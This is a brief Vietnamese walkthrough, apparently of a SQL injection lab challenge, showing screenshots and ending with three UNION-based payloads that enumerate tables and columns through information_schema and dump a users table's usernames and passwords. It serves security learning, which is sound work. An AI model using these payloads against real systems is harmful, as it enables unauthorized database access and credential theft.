![image](https://github.com/user-attachments/assets/57881ab8-7292-4492-9fd5-5e7e8c7a9274)

Như ở challenge này thì dbms không phải là oracle. Và ta cũng chưa biết được nó query xuống bao nhiêu cột trong db vì thế nên ta sẽ tiến hành tìm cột trước.

![image](https://github.com/user-attachments/assets/26e58785-ffe3-4e05-bf93-54b23b8b05b1)

![image](https://github.com/user-attachments/assets/a235d67a-861f-4ebd-9497-8cad47a42511)

Vì thế ta biết được trong query có 2 cột.

Tiếp theo thì dùng schema table để lấy thông tin thôi.

![image](https://github.com/user-attachments/assets/1fd4da9d-3307-40f6-bb38-c33c4d2dc1d2)

Vậy là đã có thông tin.

![image](https://github.com/user-attachments/assets/c756e8d5-845c-4593-a31d-381772473c65)

Tiến hành truy xuất thông tin ra và ta thấy được rằng đây là tên bảng

![image](https://github.com/user-attachments/assets/cc9db864-40b4-4d30-be73-7d7b0747d443)

![image](https://github.com/user-attachments/assets/5af764b6-3b75-4d2e-9b6c-82b940f2648f)

![image](https://github.com/user-attachments/assets/029578b7-879e-4bab-a5b6-c9a624d55929)

Vậy là thành công.

Payload:

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

Thì mục tiêu cũng chả có gì, thì cứ theo trình tự thôi `số lượng cột -> tên bảng -> tên cột` là sẽ xong
